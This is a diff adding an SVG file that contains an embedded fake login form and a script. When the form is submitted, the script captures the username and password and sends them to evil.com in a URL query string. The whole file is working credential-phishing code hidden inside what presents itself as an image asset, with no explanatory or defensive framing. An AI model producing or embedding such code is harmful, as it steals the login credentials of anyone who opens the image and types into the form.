@@ -1,0 +1,29 @@
+<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
+    <foreignObject x="0" y="0" width="400" height="200">
+        <div xmlns="http://www.w3.org/1999/xhtml">
+            <form id="loginForm" style="font-family: Arial; padding: 20px;">
+                <div style="margin-bottom: 10px;">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username"/>
+                </div>
+                <div style="margin-bottom: 10px;">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password"/>
+                </div>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </foreignObject>
+    <script type="application/ecmascript">
+        <![CDATA[
+            document.addEventListener('DOMContentLoaded', function() {
+                document.getElementById('loginForm').addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+                    window.location.href = `https://evil.com/?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                });
+            });
+        ]]>
+    </script>
+</svg>
